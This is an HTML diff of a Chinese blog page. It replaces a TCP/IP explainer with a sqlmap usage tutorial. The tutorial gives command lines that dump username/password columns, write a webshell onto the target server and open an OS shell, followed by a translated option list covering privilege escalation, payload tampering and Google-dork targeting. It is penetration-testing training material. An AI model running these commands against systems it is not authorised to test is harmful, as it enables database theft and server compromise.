@@ -112,19 +112,17 @@
 
 
 
-  <meta name="description" content="TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。 TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。 每一层都需要他的下一层所提供的协议来完成自己的需求。 TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。 物理介质 当通过http发起一个请求时，应用层、传输层、网络层和链">
+  <meta name="description" content="SQLmap简介 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。  sq">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TCP&#x2F;IP">
-<meta property="og:url" content="http://yoursite.com/2018/12/23/TCP-IP/index.html">
+<meta property="og:title" content="sqlmap使用详解">
+<meta property="og:url" content="http://yoursite.com/2019/01/05/sqlmap使用详解/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。 TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。 每一层都需要他的下一层所提供的协议来完成自己的需求。 TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。 物理介质 当通过http发起一个请求时，应用层、传输层、网络层和链">
+<meta property="og:description" content="SQLmap简介 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。  sq">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fygpaamw92j30i00f6t9b.jpg">
-<meta property="og:updated_time" content="2018-12-23T07:58:12.051Z">
+<meta property="og:updated_time" content="2019-01-07T02:00:57.940Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="TCP&#x2F;IP">
-<meta name="twitter:description" content="TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。 TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。 每一层都需要他的下一层所提供的协议来完成自己的需求。 TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。 物理介质 当通过http发起一个请求时，应用层、传输层、网络层和链">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fygpaamw92j30i00f6t9b.jpg">
+<meta name="twitter:title" content="sqlmap使用详解">
+<meta name="twitter:description" content="SQLmap简介 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。  sq">
 
 
 
@@ -133,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/23/TCP-IP/">
+  <link rel="canonical" href="http://yoursite.com/2019/01/05/sqlmap使用详解/">
 
 
 
@@ -143,7 +141,7 @@
   };
 </script>
 
-  <title>TCP/IP | guolala's blog</title>
+  <title>sqlmap使用详解 | guolala's blog</title>
   
 
 
@@ -356,7 +354,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/23/TCP-IP/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/05/sqlmap使用详解/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="guolala">
@@ -373,7 +371,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">TCP/IP
+          <h1 class="post-title" itemprop="name headline">sqlmap使用详解
               
             
           </h1>
@@ -398,12 +396,24 @@
                 
               
 
-              <time title="创建时间：2018-12-23 15:11:57 / 修改时间：15:58:12" itemprop="dateCreated datePublished" datetime="2018-12-23T15:11:57+08:00">2018-12-23</time>
+              <time title="创建时间：2019-01-05 17:01:21" itemprop="dateCreated datePublished" datetime="2019-01-05T17:01:21+08:00">2019-01-05</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-01-07 10:00:57" itemprop="dateModified" datetime="2019-01-07T10:00:57+08:00">2019-01-07</time>
               
             
           </span>
@@ -420,7 +430,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/网络及协议/" itemprop="url" rel="index"><span itemprop="name">网络及协议</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/渗透工具/" itemprop="url" rel="index"><span itemprop="name">渗透工具</span></a></span>
 
                 
                 
@@ -461,46 +471,233 @@
       
 
       
-        <p>TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。</p>
-<p>TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。</p>
-<p>每一层都需要他的下一层所提供的协议来完成自己的需求。</p>
-<p>TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。</p>
-<h1 id="物理介质"><a href="#物理介质" class="headerlink" title="物理介质"></a>物理介质</h1><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fygpaamw92j30i00f6t9b.jpg" alt=""></p>
-<p>当通过http发起一个请求时，应用层、传输层、网络层和链路层的相关协议依次对该请求进行包装并携带对应的首部，最终在链路层生成以太网数据包，以太网数据包通过物理介质传输给对方主机，对方接收到数据包以后，然后再一层一层采用对应的协议进行拆包，最后把应用层数据交给应用程序处理。</p>
-<p>配送车就是物理介质，配送站就是网关， 快递员就是路由器，收货地址就是IP地址，联系方式就是MAC地址。 </p>
-<h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><p>网络通信就是把有特定意义的数据通过物理介质传送给对方，单纯的发送0和1是没有意义的，要传输有意义的数据，就需要以字节为单位对 0 和 1 进行分组，并且要标识好每一组电信号的信息特征，然后按照分组的顺序依次发送。以太网规定一组电信号就是一个数据包，一个数据包被称为一帧， 制定这个规则的协议就是以太网协议。</p>
-<p>以太网规协议定，接入网络的设备都必须安装网络适配器，即网卡， 数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，也就是帧首部所包含的MAC地址，MAC地址是每块网卡的身份标识，就如同我们身份证上的身份证号码，具有全球唯一性。</p>
-<p>有了MAC地址以后，以太网采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。</p>
-<p><strong>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。</strong></p>
-<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>发送者如何知道接收者的MAC地址？ <strong>ARP协议</strong></p>
-<p>发送者如何知道接收者和自己同属一个子网？ <strong>IP协议</strong></p>
-<p>如果接收者和自己不在同一个子网，数据包如何发给对方？ <strong>路由协议</strong></p>
-<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><p>MAC地址只与厂商有关，与所处的网络无关，所以无法通过MAC地址来判断两台主机是否属于同一个子网。</p>
-<p>因此，网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。</p>
-<p>IP地址目前有两个版本，分别是IPv4和IPv6，IPv4是一个32位的地址，常采用4个十进制数字表示。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。为了判断IP地址中的网络地址，IP协议还引入了子网掩码， IP地址和子网掩码通过按位与运算后就可以得到网络地址。</p>
-<p>以C类地址<code>192.168.24.1</code>为例，其中前24位就是网络地址，后8位就是主机地址。<strong>如果两个IP地址在同一个子网内，则网络地址一定相同</strong></p>
-<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。</p>
-<h3 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h3><p>ARP首先会发起一个请求数据包，数据包首部包含了目标主机的IP地址，然后这个数据包会在数据链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头中的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回信息，以此来确定目标机的MAC地址，与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
-<h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><p>通过ARP协议原理可以知道，ARP的MAC寻址局限在同一子网中，因此网络层引入了路由协议，首先通过IP协议来判断两台主机是否在同一子网中，如果在同一子网中就通过ARP协议查询相应的MAC地址，然后以广播的形式向该子网内的主机发送数据包。</p>
-<p>如果不在同一个子网，以太网就会将该数据包转发给本子网的网关进行路由。网关是互联网子网与子网之间的桥梁，所以网关会进行多次转发，最终将数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给对方。</p>
-<p>而完成这个路由协议的物理设备就是路由器，在错综复杂的网络世界里，路由器扮演者交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。</p>
-<p><strong>网络层的主要工作是定义网络地址，区分网段，子网内MAC寻址，对于不同子网的数据包进行路由。</strong></p>
-<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>链路层定义了主机的身份，即MAC地址， 而网络层定义了IP地址，明确了主机所在的网段，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。</p>
-<p>因此传输层引入了UDP协议来解决这个问题，为了给每个应用程序标识身份，UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息。 这样，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。</p>
-<p>为了保证传输的可靠性，TCP 协议在 UDP 基础之上建立了三次对话的确认机制，也就是说，在正式收发数据前，必须和对方建立可靠的连接。</p>
-<p>TCP 能够保证数据包在传输过程中不被丢失，但美好的事物必然是要付出代价的，相比 UDP，TCP 实现过程复杂，消耗连接资源多，传输速度慢。</p>
-<p><strong>传输层的主要工作是定义端口，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。</strong></p>
-<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差。因此，应用层定义了各种各样的协议来规范数据格式，常见的有 HTTP、FTP、SMTP 等，HTTP 是一种比较常用的应用层协议，主要用于B/S架构之间的数据通信。</p>
-<p>有了这个规范以后，服务端收到请求以后，就能正确的解析客户端发来的数据，当请求处理完以后，再按照客户端要求的格式返回，客户端收到结果后，按照服务端返回的格式进行解析。</p>
-<p><strong>应用层的主要工作就是定义数据格式并按照对应的格式解读数据。</strong></p>
-<h1 id="全流程"><a href="#全流程" class="headerlink" title="全流程"></a>全流程</h1><ul>
-<li>链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据；</li>
-<li>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发；</li>
-<li>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序；</li>
-<li>应用层：定义数据格式，并按照对应的格式解读数据。</li>
+        <h1 id="SQLmap简介"><a href="#SQLmap简介" class="headerlink" title="SQLmap简介"></a>SQLmap简介</h1><ul>
+<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>4、联合查询注入，可以使用union的情况下的注入。</li>
+<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
 </ul>
-<p><strong>用一句通俗易懂的话讲就是：</strong></p>
-<p>当你输入一个网址并按下回车键的时候，首先，应用层协议对该请求包做了格式定义；紧接着传输层协议加上了双方的端口号，确认了双方通信的应用程序；然后网络协议加上了双方的IP地址，确认了双方的网络位置；最后链路层协议加上了双方的MAC地址，确认了双方的物理位置，同时将数据进行分组，形成数据帧，采用广播方式，通过传输介质发送给对方主机。而对于不同网段，该数据包首先会转发给网关路由器，经过多次转发后，最终被发送到目标主机。目标机接收到数据包后，采用对应的协议，对帧数据进行组装，然后再通过一层一层的协议进行解析，最终被应用层的协议解析并交给服务器处理。</p>
+<h1 id="sqlmap支持的数据库"><a href="#sqlmap支持的数据库" class="headerlink" title="sqlmap支持的数据库"></a>sqlmap支持的数据库</h1><ul>
+<li>MySQL</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+<li>Microsoft SQL Server</li>
+<li>Microsoft Access</li>
+<li>IBM DB2</li>
+<li>SQLite</li>
+<li>Firebird</li>
+<li>Sybase</li>
+<li>SAP MaxDB</li>
+</ul>
+<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”
+</code></pre><p>默认使用level1检测全部数据库类型</p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3
+</code></pre><p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<h2 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h2><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，</p>
+<p>当注入错误的时候，先报错再跳转的时候，不需要跟随302。</p>
+<p>目的就是：要追踪到错误信息。</p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>当程序有防get注入的时候，可以使用cookie注入</p>
+<pre><code>sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）
+</code></pre><h2 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h2><p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数
+</code></pre><h1 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h1><h2 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h2><pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs
+</code></pre><p>查询有哪些数据库</p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables
+</code></pre><p>查询test数据库中有哪些表</p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns
+</code></pre><p>查询test数据库中admin表有哪些字段</p>
+<pre><code>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
+</code></pre><p>dump出字段username与password中的数据</p>
+<p>其他命令参考下面</p>
+<h2 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h2><pre><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
+</code></pre><p>在dedecms数据库中搜索字段admin或者password。</p>
+<h2 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h2><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<ul>
+<li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</li>
+<li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</li>
+<li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+</ul>
+<p>示例：</p>
+<pre><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
+</code></pre><p>使用shell命令：</p>
+<pre><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
+</code></pre><p>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p>
+<p>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<h1 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h1><ul>
+<li>–is-dba 当前用户权限（是否为root权限）</li>
+<li>–dbs 所有数据库</li>
+<li>–current-db 网站当前数据库</li>
+<li>–users 所有数据库用户</li>
+<li>–current-user 当前数据库用户</li>
+<li>–random-agent 构造随机user-agent</li>
+<li>–passwords 数据库密码</li>
+<li>–proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+</ul>
+<h2 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h2><ul>
+<li>–version 显示程序的版本号并退出</li>
+<li>-h, –help 显示此帮助消息并退出</li>
+<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+</ul>
+<p>保存进度继续跑：</p>
+<pre><code>sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度
+sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度
+</code></pre><h2 id="Target（目标）"><a href="#Target（目标）" class="headerlink" title="Target（目标）"></a>Target（目标）</h2><p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<ul>
+<li>-d DIRECT 直接连接到数据库。</li>
+<li>-u URL, –url=URL 目标URL。</li>
+<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
+<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
+<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
+<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
+</ul>
+<h2 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h2><p>这些选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li>–data=DATA 通过POST发送的数据字符串</li>
+<li>–cookie=COOKIE HTTP Cookie头</li>
+<li>–cookie-urlencode URL 编码生成的cookie注入</li>
+<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
+<li>–user-agent=AGENT 指定 HTTP User – Agent头</li>
+<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
+<li>–referer=REFERER 指定 HTTP Referer头</li>
+<li>–headers=HEADERS 换行分开，加入其他的HTTP头</li>
+<li>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
+<li>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</li>
+<li>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）</li>
+<li>–proxy=PROXY 使用HTTP代理连接到目标URL</li>
+<li>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</li>
+<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
+<li>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
+<li>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</li>
+<li>–retries=RETRIES 连接超时后重新连接的时间（默认3）</li>
+<li>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
+<li>–safe-url=SAFURL 在测试过程中经常访问的url地址</li>
+<li>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</li>
+</ul>
+<h2 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p>
+<ul>
+<li>-b, –banner 检索数据库管理系统的标识</li>
+<li>–current-user 检索数据库管理系统当前用户</li>
+<li>–current-db 检索数据库管理系统当前数据库</li>
+<li>–is-dba 检测DBMS当前用户是否DBA</li>
+<li>–users 枚举数据库管理系统用户</li>
+<li>–passwords 枚举数据库管理系统用户密码哈希</li>
+<li>–privileges 枚举数据库管理系统用户的权限</li>
+<li>–roles 枚举数据库管理系统用户的角色</li>
+<li>–dbs 枚举数据库管理系统数据库</li>
+<li>-D DBname 要进行枚举的指定数据库名</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
+<li>–tables 枚举的DBMS数据库中的表</li>
+<li>–columns 枚举DBMS数据库表列</li>
+<li>–dump 转储数据库管理系统的数据库中的表项</li>
+<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
+<li>–search 搜索列（S），表（S）和/或数据库名称（S）</li>
+<li>-C COL 要进行枚举的数据库列</li>
+<li>-U USER 用来进行枚举的数据库用户</li>
+<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
+<li>–start=LIMITSTART 第一个查询输出进入检索</li>
+<li>–stop=LIMITSTOP 最后查询的输出进入检索</li>
+<li>–first=FIRSTCHAR 第一个查询输出字的字符检索</li>
+<li>–last=LASTCHAR 最后查询的输出字字符检索</li>
+<li>–sql-query=QUERY 要执行的SQL语句</li>
+<li>–sql-shell 提示交互式SQL的shell</li>
+</ul>
+<h2 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a>Optimization（优化）</h2><p>这些选项可用于优化SqlMap的性能。</p>
+<ul>
+<li>-o 开启所有优化开关</li>
+<li>–predict-output 预测常见的查询输出</li>
+<li>–keep-alive 使用持久的HTTP（S）连接</li>
+<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+</ul>
+<h2 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h2><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER 可测试的参数（S）</li>
+<li>–dbms=DBMS 强制后端的DBMS为此值</li>
+<li>–os=OS 强制后端的DBMS操作系统为这个值</li>
+<li>–prefix=PREFIX 注入payload字符串前缀</li>
+<li>–suffix=SUFFIX 注入payload字符串后缀</li>
+<li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li>
+</ul>
+<h2 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h2><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<ul>
+<li>–level=LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>–risk=RISK 执行测试的风险（0-3，默认为1）</li>
+<li>–string=STRING 查询时有效时在页面匹配字符串</li>
+<li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>–text-only 仅基于在文本内容比较网页</li>
+</ul>
+<h2 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h2><p>这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>–technique=TECH SQL注入技术测试（默认BEUST）</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>–union-cols=UCOLS 定列范围用于测试UNION查询注入</li>
+<li><p>–union-char=UCHAR 用于暴力猜解列数的字符</p>
+<h2 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h2></li>
+<li><p>-f, –fingerprint 执行检查广泛的DBMS版本指纹</p>
+</li>
+</ul>
+<h2 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h2><p>这些选项可以被用来运行蛮力检查。</p>
+<ul>
+<li>–common-tables 检查存在共同表</li>
+<li>–common-columns 检查存在共同列</li>
+</ul>
+<h2 id="User-defined-function-injection（用户自定义函数注入）："><a href="#User-defined-function-injection（用户自定义函数注入）：" class="headerlink" title="User-defined function injection（用户自定义函数注入）："></a>User-defined function injection（用户自定义函数注入）：</h2><p>这些选项可以用来创建用户自定义函数。</p>
+<ul>
+<li>–udf-inject 注入用户自定义函数</li>
+<li>–shared-lib=SHLIB 共享库的本地路径</li>
+</ul>
+<h2 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h2><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+</ul>
+<h2 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>–os-cmd=OSCMD 执行操作系统命令</li>
+<li>–os-shell 交互式的操作系统的shell</li>
+<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-bof 存储过程缓冲区溢出利用</li>
+<li>–priv-esc 数据库进程用户权限提升</li>
+<li>–msf-path=MSFPATH Metasploit Framework本地的安装路径</li>
+<li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
+</ul>
+<h2 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>–reg-read 读一个Windows注册表项值</li>
+<li>–reg-add 写一个Windows注册表项值数据</li>
+<li>–reg-del 删除Windows注册表键值</li>
+<li>–reg-key=REGKEY Windows注册表键</li>
+<li>–reg-value=REGVAL Windows注册表项值</li>
+<li>–reg-data=REGDATA Windows注册表键值数据</li>
+<li>–reg-type=REGTYPE Windows注册表项值类型</li>
+</ul>
+<p>这些选项可以用来设置一些一般的工作参数。</p>
+<ul>
+<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
+<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
+<li>–flush-session 刷新当前目标的会话文件</li>
+<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>–eta 显示每个输出的预计到达时间</li>
+<li>–update 更新SqlMap</li>
+<li>–save file保存选项到INI配置文件</li>
+<li>–batch 从不询问用户输入，使用所有默认配置。</li>
+</ul>
+<h2 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h2><ul>
+<li>–beep 发现SQL注入时提醒</li>
+<li>–check-payload IDS对注入payloads的检测测试</li>
+<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>–forms 对目标URL的解析和测试形式</li>
+<li>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>–page-rank Google dork结果显示网页排名（PR）</li>
+<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</li>
+<li>–wizard 给初级用户的简单向导界面</li>
+</ul>
 
       
     </div>
@@ -531,8 +728,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/23/信息收集-DNS、IP/" rel="next" title="信息收集--DNS、IP">
-                <i class="fa fa-chevron-left"></i> 信息收集--DNS、IP
+              <a href="/2019/01/02/一次完整的HTTP请求过程/" rel="next" title="一次完整的HTTP请求过程">
+                <i class="fa fa-chevron-left"></i> 一次完整的HTTP请求过程
               </a>
             
           </div>
@@ -540,10 +737,6 @@
           <span class="post-nav-divider"></span>
 
